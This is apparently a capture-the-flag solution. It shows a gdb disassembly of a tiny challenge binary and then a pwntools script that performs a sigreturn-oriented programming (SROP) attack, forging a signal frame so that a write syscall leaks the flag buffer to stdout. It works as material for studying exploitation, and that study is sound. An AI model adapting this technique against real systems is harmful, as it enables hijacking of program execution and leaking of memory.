'''
Dump of assembler code for function _start:
   0x0000000010000000 <+0>:     xor    eax,eax
   0x0000000010000002 <+2>:     xor    edi,edi
   0x0000000010000004 <+4>:     xor    edx,edx
   0x0000000010000006 <+6>:     mov    dh,0x4
   0x0000000010000008 <+8>:     mov    rsi,rsp
   0x000000001000000b <+11>:    syscall
   0x000000001000000d <+13>:    xor    edi,edi
   0x000000001000000f <+15>:    push   0xf
   0x0000000010000011 <+17>:    pop    rax
   0x0000000010000012 <+18>:    syscall
   0x0000000010000014 <+20>:    int3
'''

from pwn import *

context.arch = 'amd64'
elf = ELF('./funsignals_player_bin')
target = process('./funsignals_player_bin')

frame = SigreturnFrame()
frame.rip = 0x10000012 # 0x1000000b addr for syscall
frame.rax = 1  # write syscall
frame.rdi = 1 # stdout
frame.rsi = 0x10000023 # addr of flag buffer
frame.rdx = 100 # len

target.send(bytes(frame))
target.interactive()
